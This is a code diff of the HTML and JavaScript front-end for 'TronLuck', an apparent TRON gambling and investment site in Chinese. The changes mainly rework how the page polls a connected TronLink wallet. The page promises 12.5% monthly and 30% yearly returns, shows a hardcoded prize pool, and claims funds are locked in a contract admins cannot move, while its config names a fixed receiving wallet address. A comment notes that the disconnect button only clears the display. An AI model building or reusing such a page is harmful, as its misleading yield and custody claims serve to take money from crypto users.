@@ -6,20 +6,18 @@
     <title>TronLuck | 去中心化游戏金融协议</title>
     <link rel="manifest" href="manifest.json">
     
-    <!-- 资源库 -->
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 
     <script>
-        tailwind.config = {
-            theme: { extend: { colors: { bg: '#0f111a', surface: '#1e212b', primary: '#8b5cf6', secondary: '#10b981' } } }
-        }
+        tailwind.config = { theme: { extend: { colors: { bg: '#0f111a', surface: '#1e212b', primary: '#8b5cf6', secondary: '#10b981' } } } }
     </script>
     <style>
         [x-cloak] { display: none !important; }
         body { background-color: #0f111a; color: #fff; -webkit-tap-highlight-color: transparent; }
+        .no-scrollbar::-webkit-scrollbar { display: none; }
         .glass { background: rgba(30, 33, 43, 0.95); backdrop-filter: blur(10px); border-bottom: 1px solid rgba(255, 255, 255, 0.05); }
         .feature-card { border: 1px solid rgba(255,255,255,0.05); background: rgba(255,255,255,0.03); }
     </style>
@@ -33,14 +31,14 @@
             <i class="fa-solid fa-cube text-primary"></i> Tron<span class="text-white">Luck</span>
         </div>
         
-        <!-- 未连接 -->
+        <!-- 未连接状态 -->
         <button x-show="!wallet" @click="manualConnect()" 
             class="text-xs bg-primary hover:bg-purple-600 text-white border border-purple-500 rounded-full px-4 py-1.5 flex items-center gap-2 transition active:scale-95 shadow-lg">
             <i class="fa-solid fa-wallet"></i> 
             <span x-text="btnText">连接钱包</span>
         </button>
 
-        <!-- 已连接 -->
+        <!-- 已连接状态 -->
         <div x-show="wallet" class="flex items-center gap-2 bg-surface border border-gray-700 rounded-full pl-3 pr-1 py-1">
             <div class="flex items-center gap-1">
                 <span class="text-green-400 font-bold text-xs" x-text="balance">0</span>
@@ -48,6 +46,7 @@
             </div>
             <div class="w-[1px] h-4 bg-gray-700 mx-1"></div>
             <span class="text-xs text-gray-300 font-mono" x-text="shortAddr(wallet)"></span>
+            <!-- 并没有真的断开，只是清除显示 -->
             <button @click="disconnect()" class="w-6 h-6 rounded-full bg-red-500/10 hover:bg-red-500 text-red-500 hover:text-white flex items-center justify-center transition ml-1">
                 <i class="fa-solid fa-power-off text-[10px]"></i>
             </button>
@@ -56,7 +55,7 @@
 
     <!-- 主内容区 -->
     <main class="flex-1 overflow-y-auto pt-16 pb-24 px-4 space-y-8">
-        <!-- 🏠 1. 首页 (Home) -->
+        <!-- 首页 -->
         <div x-show="activeTab === 'home'" x-transition.opacity class="space-y-8">
             <div class="text-center py-8">
                 <div class="inline-block px-3 py-1 rounded-full bg-primary/20 text-primary text-xs font-bold mb-4 border border-primary/30">🚀 波场 0 Gas 游戏金融协议</div>
@@ -67,14 +66,12 @@
                     <button @click="activeTab='wealth'" class="bg-surface border border-gray-700 text-white px-8 py-3 rounded-full font-bold active:scale-95 transition">参与众筹</button>
                 </div>
             </div>
-            <!-- 核心优势 -->
             <div class="grid grid-cols-2 gap-3">
                 <div class="feature-card p-4 rounded-xl"><i class="fa-solid fa-code text-2xl text-blue-400 mb-2"></i><h4 class="font-bold text-sm">智能合约托管</h4><p class="text-[10px] text-gray-400 mt-1">资金锁定在链上合约，管理员无法挪用。</p></div>
                 <div class="feature-card p-4 rounded-xl"><i class="fa-solid fa-wallet text-2xl text-purple-400 mb-2"></i><h4 class="font-bold text-sm">资金在您手中</h4><p class="text-[10px] text-gray-400 mt-1">非托管式游戏。不下注时资金100%在您的钱包。</p></div>
             </div>
-            <!-- 路线图 -->
             <div class="bg-surface/30 p-4 rounded-xl border border-gray-800">
-                <h3 class="font-bold text-sm mb-3">🗺️ 发展路线</h3>
+                <h3 class="font-bold text-sm mb-3">🗺️ 发展路线图</h3>
                 <ul class="text-xs text-gray-400 space-y-2">
                     <li class="flex gap-2"><span class="text-primary">●</span> Phase 1: 协议启动，上线哈希游戏。</li>
                     <li class="flex gap-2"><span class="text-gray-600">●</span> Phase 2: SunPump 发币与空投。</li>
@@ -82,7 +79,7 @@
             </div>
         </div>
 
-        <!-- 🎮 2. 游戏大厅 -->
+        <!-- 游戏大厅 -->
         <div x-show="activeTab === 'game'" x-transition>
             <div class="bg-gradient-to-r from-purple-900 to-indigo-900 rounded-2xl p-5 mb-6 shadow-lg">
                 <p class="text-xs text-purple-200 mb-1">奖金池</p><h2 class="text-3xl font-bold text-white mb-2">128,500 <span class="text-sm">TRX</span></h2>
@@ -93,14 +90,14 @@
             </div>
         </div>
 
-        <!-- 💰 3. 理财 -->
+        <!-- 理财 -->
         <div x-show="activeTab === 'wealth'" x-transition>
             <div class="bg-surface p-1 rounded-lg flex mb-6"><button @click="investType='equity'" :class="investType==='equity'?'bg-gray-700 text-white':'text-gray-500'" class="flex-1 py-2 text-sm font-bold rounded">我是股东</button><button @click="investType='fixed'" :class="investType==='fixed'?'bg-gray-700 text-white':'text-gray-500'" class="flex-1 py-2 text-sm font-bold rounded">定期理财</button></div>
             <div x-show="investType==='equity'" class="text-center py-4"><h2 class="text-4xl font-bold text-primary">12.5%</h2><p class="text-xs text-gray-400">历史月化</p><div class="bg-surface rounded-xl p-5 border border-gray-800 mt-4 flex gap-3"><input type="number" x-model="investAmount" placeholder="输入 TRX" class="flex-1 bg-black/30 border border-gray-700 rounded-lg px-3 text-sm text-white focus:outline-none"><button @click="doInvest()" class="bg-primary text-white px-6 py-2 rounded-lg text-sm font-bold">存入</button></div></div>
             <div x-show="investType==='fixed'" class="space-y-4"><div class="bg-surface rounded-xl p-4 border-l-4 border-blue-500 flex justify-between items-center"><div><h3 class="font-bold text-white">稳健月卡</h3><p class="text-xs text-gray-400">锁仓 30 天</p></div><div class="text-right"><div class="text-xl font-bold text-green-400">30%</div><div class="text-[10px] text-gray-500">年化 APY</div></div></div></div>
         </div>
 
-        <!-- 👤 4. 我的 -->
+        <!-- 我的 -->
         <div x-show="activeTab === 'mine'" x-transition>
             <div class="bg-surface rounded-2xl p-6 text-center mb-6 border border-gray-800"><div class="w-16 h-16 bg-gray-700 rounded-full mx-auto mb-3 flex items-center justify-center text-2xl">👾</div><h2 x-text="wallet ? shortAddr(wallet) : '未连接钱包'" class="font-bold text-lg"></h2><div x-show="wallet" class="mt-2 text-sm text-green-400 font-bold" x-text="balance + ' TRX'"></div></div>
         </div>
@@ -126,7 +123,7 @@
         </div>
     </div>
 
-    <!-- 逻辑脚本 (终极修复版) -->
+    <!-- 逻辑脚本 (暴力监听版) -->
     <script>
         const CONFIG = {
             receiveAddr: "THPWTQ8rYTAMb4UqCmksdswTXWkxLdA8Lm",
@@ -138,6 +135,7 @@
                 activeTab: 'home',
                 investType: 'equity',
                 gameModalOpen: false,
+                walletModalOpen: false,
                 playMode: 'web3',
                 wallet: '',
                 balance: '0.00',
@@ -147,44 +145,32 @@
                 config: CONFIG,
                 
                 init() {
-                    console.log("System Init...");
-                    // 1. 心跳检测机制 (Heartbeat)
-                    // 每 1.5 秒检查一次钱包状态，不管你刷没刷新，只要 TronLink 准备好了，我就连上
+                    console.log("Starting Polling Engine...");
+                    // --- 暴力轮询引擎 ---
+                    // 不管你刷不刷新，每 1 秒我就查一次状态
+                    // 这解决了 "刷新后断开" 的问题，因为刷新后 1 秒内它就会自动查到已连接
                     setInterval(() => {
-                        this.checkConnectionStatus();
-                    }, 1500);
-
-                    // 2. 监听账号切换
-                    window.addEventListener('message', (e) => {
-                        if (e.data.message && e.data.message.action == "accountsChanged") {
-                            this.checkConnectionStatus();
-                        }
-                    });
+                        this.forceCheckWallet();
+                    }, 1000);
                 },
 
-                // --- 核心：静默检查状态 ---
-                async checkConnectionStatus() {
-                    // 只要缓存里说"连过"，或者 tronWeb 已经是 ready 状态，就尝试同步
-                    const cached = localStorage.getItem('tron_connected');
-                    
+                // --- 强制检查函数 ---
+                async forceCheckWallet() {
+                    // 只有当 window.tronWeb 存在且 ready 时，才视为连接成功
                     if (window.tronWeb && window.tronWeb.ready) {
-                        // 钱包已就绪，直接同步数据
+                        // 如果当前显示的地址不对，立马更新
                         if (this.wallet !== window.tronWeb.defaultAddress.base58) {
                             this.wallet = window.tronWeb.defaultAddress.base58;
                             this.btnText = "已连接";
-                            localStorage.setItem('tron_connected', 'true'); // 补票
+                            // 顺便更新余额
                             try {
                                 const bal = await window.tronWeb.trx.getBalance(this.wallet);
                                 this.balance = (bal / 1e6).toFixed(2);
                             } catch(e) {}
                         }
                     } else {
-                        // 钱包没就绪
-                        if (cached !== 'true') {
-                            // 如果本来就没连过，那是正常的
-                            this.wallet = '';
-                        }
-                        // 如果缓存说连过，但现在没 ready，可能是还在加载，先保持沉默，等下一次心跳
+                        // 如果不 ready，说明没解锁或者没安装，保持断开状态
+                        // 这里不做任何操作，等待用户手动点击或者解锁
                     }
                 },
 
@@ -193,56 +179,41 @@
                     this.btnText = "连接中...";
                     
                     if (!window.tronWeb) {
-                        alert("未检测到钱包插件！");
+                        alert("未检测到钱包插件，请安装 TronLink！");
                         this.btnText = "连接钱包";
                         return;
                     }
 
-                    // 如果已经 ready，直接完成
+                    // 1. 如果已经 Ready，直接触发更新
                     if (window.tronWeb.ready) {
-                        await this.checkConnectionStatus();
+                        this.forceCheckWallet();
                         return;
                     }
 
-                    // 发起请求
+                    // 2. 尝试请求 (不管报错与否)
                     try {
-                        const res = await window.tronWeb.request({ method: 'tron_requestAccounts' });
-                        if (res.code === 200) {
-                            // 给它一点时间反应
-                            setTimeout(() => this.checkConnectionStatus(), 500);
-                        } else {
-                            // 兜底：虽然 code 不是 200，但可能其实 ready 了
-                            setTimeout(() => {
-                                if(window.tronWeb.ready) this.checkConnectionStatus();
-                                else {
-                                    alert("请在插件中解锁钱包！");
-                                    this.btnText = "连接钱包";
-                                }
-                            }, 1000);
-                        }
+                        await window.tronWeb.request({ method: 'tron_requestAccounts' });
                     } catch(e) {
-                        console.log("Request error, trying fallback...");
-                        // 报错了也不怕，等 1 秒再查一次 Ready 状态
-                        setTimeout(() => {
-                            if(window.tronWeb.ready) {
-                                this.checkConnectionStatus();
-                            } else {
-                                alert("连接失败：请解锁钱包并重试。");
-                                this.btnText = "连接钱包";
-                            }
-                        }, 1000);
+                        console.log("Request ignored (likely already pending or connected)");
+                    }
+
+                    // 3. 无论请求结果如何，给用户弹个窗提示解锁
+                    // 只要用户解锁了，上面的 setInterval 就会自动连上
+                    if (!window.tronWeb.ready) {
+                        alert("请在钱包插件中输入密码解锁！\n解锁后会自动连接，无需再次点击。");
+                        this.btnText = "等待解锁...";
                     }
                 },
 
                 disconnect() {
+                    // 这是一个软断开，只清除网页显示
+                    // 真正的断开需要在钱包插件里操作
                     this.wallet = '';
                     this.balance = '0.00';
                     this.btnText = "连接钱包";
-                    localStorage.removeItem('tron_connected');
                     location.reload();
                 },
 
-                // 业务功能
                 openGame(type) {
                     this.gameModalOpen = true;
                     setTimeout(() => {
